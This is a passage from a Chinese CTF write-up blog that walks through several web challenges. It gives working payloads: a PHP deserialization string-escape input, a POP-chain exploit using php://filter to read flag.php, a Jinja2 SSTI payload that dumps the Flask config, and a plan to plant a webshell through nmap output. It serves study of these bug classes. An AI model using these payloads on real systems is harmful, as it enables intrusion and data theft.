class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让参数f等于“phpinfo”，因为题目提示说这里可能会找到些东西。</p><p>在phpinfo里看到了这个：</p><p><img src="../images/image-20230408190916573.png" alt="image-20230408190916573"></p><p>提示有一个文件，那么现尝试一下直接读取  那一般来说肯定是读取不到的</p><p><strong>很明显是要读取这个文件，代码里读取文件的地方在这里：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取的是base64解码后的$userinfo[‘img’]，$userinfo的值是$serialize_info的反序列化对象，$serialize_info是经过自定义函数过滤的序列化后的$_SESSION。</p><p>这个自定义函数filter惹祸了，考察了知识点：<strong>反序列化字符逃逸。</strong></p><p>只能让img_path为空，并把guest_img.png逃逸出去。</p><p>先本地测试，看看序列化后的字符串是什么样的:</p><p><img src="../images/image-20230408192908200.png" alt="image-20230408192908200"></p><p>然后是变量覆盖后的序列化结果</p><p><img src="../images/image-20230408193210085.png" alt="image-20230408193210085"></p><p>这里就是关键了，可以让传进来的值使得覆盖掉后面的img内容，因为有filter函数会进行匹配，匹配到替换为空，然后用来的字符串长度不变，就会接着匹配适合的长度，这个适合的长度我们就得进行计算，然后使得img里的值为flag的base64编码值</p><p>(和show的字符串逃逸差不多)</p><p><img src="../images/image-20230408193734376.png" alt="image-20230408193734376"></p><p>这是我们要传的值</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[imgphpflag]=;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>反序列化后的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:10:&quot;img&quot;;s:50:&quot;;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure><p><strong>思路</strong></p><p>就是把自己在本地创建好的payload写上去，然后根据传的参数名字的payload</p><p>长度计算好，然后在传进去一个那个变量的内容，然后在把后面的img传进去就好了<br><strong>能看懂序列化出来的东西是咋样组成的就行</strong></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>题目</p><p><img src="../images/image-20230408200347832.png" alt="image-20230408200347832"></p><p>一个购买东西的平台</p><p><img src="../images/image-20230408200457185.png" alt="image-20230408200457185"></p><p>可以看到在charset=”utf-8”后面有提示，这里非常重要。</p><p>但是很多的网站都是utf-8编码，为什么会说这里很重要?</p><p>回到购买界面，我们输入其他的价格，发现输入10的时候有提示</p><p><img src="../images/image-20230408200520327.png" alt="image-20230408200520327"></p><p>告诉了我们只能使用一个字符，一个字符能够购买的就只有前三只独角兽，虽然我也没有购买成功hhh</p><p>所以猜测只要购买了第四只独角兽，就能获取flag，于是我们需要找到一个字符比1337大的数字</p><p><strong>也就是utf-8编码的转换安全问题</strong></p><p><a href="https://xz.aliyun.com/t/5402#toc-8">浅谈Unicode设计的安全性</a></p><p><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a></p><p>就是可以通过一些相同含义的数字但不同样子的数字或者字母可以用来绕过过滤</p><p><img src="../images/image-20230408201042425.png" alt="image-20230408201042425"></p><p>它和英文字母a都能访问baidu.com</p><p>所以说在过滤a的时候可以用它来进行绕过</p><p>这里解题的关键就是找一个单个字符是大于1337的</p><p>这里就得用到一个网站了</p><p><a href="https://www.compart.com/en/unicode/U+10123">unicode</a>    </p><p><img src="../images/image-20230408201802214.png" alt="image-20230408201802214"></p><p>然后随便点一个大于1337的就行了</p><p><img src="../images/image-20230408201842658.png" alt="image-20230408201842658"></p><p>然后将0x换成%进行传参就好了</p><p>其实中文的万也行   亿也行</p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个pop链的构造</p><p><strong>思路</strong></p><p>先看一下Modifier类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//这里的include函数，可以让我们来进行php伪协议，这里是第一个突破口。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里可以利用include来传入一个php伪协议来访问flag.php，然后通过一系列的方法来进行调用。</p><p>_invoke函数被调用时会触发include函数。</p><p>这里的include函数是触发漏洞的最后一步。</p><p>那么如何调用invoke呢。</p><p>这里我们可以看Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有_get()魔术方法。</p><p>这里直接将t h i s − &gt; p 进 行 了 调 用 。 这 里 将 this-&gt;p进行了调用。这里将this−&gt;p进行了调用。这里将this-&gt;p设为一个构造好的Modifier对象。</p><p>然后在看show类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;<span class="comment">//在一个对象被当作一个字符串使用时调用，当echo一个对象时会自动触发这个方法。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;<span class="comment">//使用了黑名单过滤了一下http协议的东西，但是不影响咱们的php伪协议。</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>show类中的__construct()魔术方法</p><p>创建新对象的时候会自动调用这个方法</p><p>主要利用__toString() 这个魔术方法</p><p>在一个对象被当作一个字符串使用时调用，当echo一个对象时会自动触发这个方法。返回了$this-&gt;str-&gt;source;</p><p>所以要echo include()里的内容</p><p>的让source等于一个对象<br><strong>最终思路</strong></p><p>向pop传值→触发unserialize函数→触发<code>__wakeup</code>→触发对象当作字符串用→触发<code>__toString</code>→触发调用不可读取属性→触发<code>__get</code>→触发对象当作函数使用→触发<code>__invoke</code>→调用append，append里有include文件包含</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一道ssti   jnjia2模板的考题</p><p>我们查看源码，可以知道我们提交的参数之中的<code>()</code>会被置为空，同时会将黑名单内的内容遍历一遍，把参数内的与黑名单相同的置为<code>None</code></p><p>如果没有黑名单的时候，我们可以使用<code>config</code>，传入 <code>config</code>，或者使用<code>self</code>，传入 <code>&#123;&#123;self.__dict__&#125;&#125;</code></p><p>当<code>config</code>,<code>self</code>,<code>()</code>都被过滤的时候，为了获取讯息，我们需要读取一些例如<code>current_app</code>这样的全局变量。</p><p>看了其他师傅的WP，python的沙箱逃逸这里的方法是<code>利用python对象之间的引用关系来调用被禁用的函数对象</code>。</p><p>这里有两个函数包含了<code>current_app</code>全局变量，<code>url_for</code>和<code>get_flashed_messages</code></p><p>这里和常规的ssti不同的地方在于  这里执行命令的方法是</p><p><code>return flask.render_template_string(safe_jinja(shrine))</code></p><p>常规的是<code>eval()</code></p><p><img src="../images/image-20230408210526834.png" alt="image-20230408210526834"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>题目</p><p><img src="../images/image-20230408211012509.png" alt="image-20230408211012509"></p><p>先抓个包看一下运行流程，首先index.php用了POST传参传过去一个host参数，然后本地又发起了一个GET请求，传了一个参数f=90131，通过修改此参数，发现PHP报错 simplexml_load_file(): I/O warning : failed to load external entity “xml/90132” in <strong>/var/www/html/result.php</strong> on line <strong>23</strong></p><p>simplexml_load_file() 函数是把 XML 文档载入对象中，所以初步猜想，应该是nmap将扫描的结果保存为了xml文档，然后PHP再打开该文档解析，后台命令可能为nmap -oX 127.0.0.1 ./xml/????</p><p>这里就需要稍微了解一下nmap的指令了，稍微在网上收集了一些常用命令，以便后面查阅：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 127.0.0.1给出了远程机器更详细的信息，显示冗余信息(扫描细节)</span><br><span class="line">nmap -iL nmaptest.txt 运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址</span><br><span class="line">nmap 192.168.0.* --exclude 192.168.0.100使用“-exclude”选项来排除某些你不想要扫描的主机</span><br><span class="line">nmap -A 192.168.0.101启用操作系统和版本检测，脚本扫描和路由跟踪功能</span><br><span class="line">nmap -O 127.0.0.1使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息</span><br><span class="line">nmap -sA 192.168.0.101扫描远程主机以探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">nmap -PN 192.168.0.101扫描主机检测其是否受到数据包过滤软件或防火墙的保护</span><br><span class="line">nmap -sP 192.168.0.*找出网络中的在线主机</span><br><span class="line">nmap -F 192.168.0.101快速扫描，仅扫描nmap-services文件中的端口而避开所有其它的端口</span><br><span class="line">nmap -f 192.168.96.4使用小数据包发送，避免被识别出</span><br><span class="line">nmap -r 192.168.0.101不会随机的选择端口扫描</span><br><span class="line">nmap -p 80,443 192.168.0.101使用“-P”选项指定你想要扫描的端口</span><br><span class="line">nmap -sV 192.168.0.101查找主机服务版本号</span><br><span class="line">nmap -PS 192.168.0.101使用TCP ACK和TCP Syn方法来扫描远程主机（防火墙会阻断标ICMP包）</span><br><span class="line">nmap -Pn 192.168.96.4  目标机禁用ping，绕过ping扫描</span><br><span class="line">nmap -sn 192.168.96.4对目标进行ping检测，不进行端口扫描（发送四种报文确定目标是否存活）</span><br><span class="line">nmap -sS 192.168.0.101执行一次隐蔽的扫描，安全，快</span><br><span class="line">nmap -sT 192.168.0.101使用TCP Syn扫描最常用的端口，不安全，慢</span><br><span class="line">nmap -sN 192.168.0.101执行TCP空扫描以骗过防火墙</span><br><span class="line">nmap -sI 僵尸ip 目标ip使用僵尸机对目标机发送数据包</span><br><span class="line">nmap 192.168.96.4 -oX myscan.xml对扫描结果另存在myscan.xml</span><br><span class="line">nmap -T1~6 192.168.96.4设置扫描速度，一般T4足够</span><br><span class="line">nmap –mtu &lt;size&gt; 192.168.96.4发送的包大小,最大传输单元必须是8的整数</span><br><span class="line">nmap -D &lt;假ip&gt; 192.168.96.4发送参杂着假ip的数据包检测</span><br><span class="line">继续中断扫描：</span><br><span class="line">nmap –oG 1.txt –v 192.168.1.1/24-oG将扫描结果保存为TXT，Ctrl+C中断扫描</span><br><span class="line">Nmap –resume 1.txt作用：继续扫描</span><br></pre></td></tr></table></figure><p>看了很多资料后，知道了，nmap可以将扫描后的结果保存为文件，这个文件格式甚至可以自己决定，那岂不是可以直接尝试写一句话木马了。。。。</p><p>把nmap保存文件的一些方法截下来：</p><p><img src="../images/image-20230408213113606.png" 